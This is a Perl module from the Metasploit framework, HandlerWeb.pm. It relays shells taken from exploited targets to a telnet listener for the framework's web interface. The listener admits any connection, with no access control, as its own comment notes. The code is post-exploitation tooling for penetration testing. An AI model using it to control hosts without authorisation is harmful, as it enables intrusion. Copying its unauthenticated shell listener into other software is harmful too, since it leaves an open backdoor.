#!/usr/bin/perl
###############

##
#         Name: HandlerWeb.pm
#       Author: H D Moore <hdm [at] metasploit.com>
#      Version: $Revision$
#  Description: Payload Handlers for web server UI
#      License:
#
#      This file is part of the Metasploit Exploit Framework
#      and is subject to the same licenses and copyrights as
#      the rest of this package.
#
##

package Msf::HandlerWeb;
use base 'Msf::HandlerCLI';
use IO::Socket;
use IO::Select;
use POSIX;
use Pex;

use strict;


sub shell_proxy
{
    my ($self, $pump, @args) = @_;
    my $b = $self->GetVar('BROWSER');
    
    my $s = IO::Socket::INET->new (
                Proto => "tcp",
                LocalPort => 0,
                Type => SOCK_STREAM,
                ReuseAddr => 1,
                Listen => 5
    );

    # the findsock handler passes a non-socket as the shell
    if ($args[0]->can("sockhost"))
    {
        $b->send("[*] Processing connection: " . 
                 $args[0]->sockhost . ":" . $args[0]->sockport . " -- " .
                 $args[0]->peerhost . ":" . $args[0]->peerport . "\n");
    }
    
    $b->send("[*] Proxy shell started on port ". $s->sockport ."\n");
    $b->send("[*] Please click <a href='telnet://" . Pex::InternetIP() .":".$s->sockport."'>here</a>.<br>\n");

    my $proxy = fork(); 
    return $proxy if $proxy;

    $SIG{"TERM"} = sub { exit(0) };
    $SIG{"INT"}  = sub { exit(0) };
    
    my $birth = time();
    Pex::Unblock($s);
    
    my $sel = IO::Select->new($s);

    while ($birth + 300 > time())
    {
        my @X = $sel->can_read(0.5);
        if (scalar(@X))
        {
            # XXX - no access control!!!
            my $victim = $s->accept();

            $victim->send("[*] Welcome to the Shell Proxy :)\n");
            
            if ($args[0]->can("sockhost"))
            {
                $victim->send("[*] Connected to " . $args[0]->peerhost . ":" . $args[0]->peerport . "\n\n");
            }
            
            # In the ghetto, the mighty ghetto, some coders write like this...
            eval("\$self->SUPER::$pump(\$victim, \@args)");
            $victim->send("[*] Exiting Shell Proxy...\n");
            $victim->close();
            undef($victim);
            exit(0);            
        }
    }
}


# Overload the DataPumps to replace the console with the telnet connection

sub DataPumpSplit
{
    my $self = shift;
    my $cons = shift;
    my $proxy = $self->shell_proxy('DataPumpSplit', @_);
    waitpid($proxy, 0);
}

sub DataPumpXor
{
    my $self = shift;
    my $cons = shift;    
    my $proxy = $self->shell_proxy('DataPumpXor', @_);
    waitpid($proxy, 0);
}

sub DataPump
{    
    my $self = shift;
    my $cons = shift;    
    my $proxy = $self->shell_proxy('DataPump', @_);
    waitpid($proxy, 0); 
}
1;
